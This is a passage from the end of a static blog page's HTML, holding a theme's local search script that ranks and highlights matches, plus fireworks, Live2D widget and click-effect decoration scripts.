                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  



   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
   <script type="text/javascript" src="/js/src/fireworks.js"></script>

<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>

<!-- ҳ����С���� -->
<script type="text/javascript" src="/js/src/clicklove.js"></script>

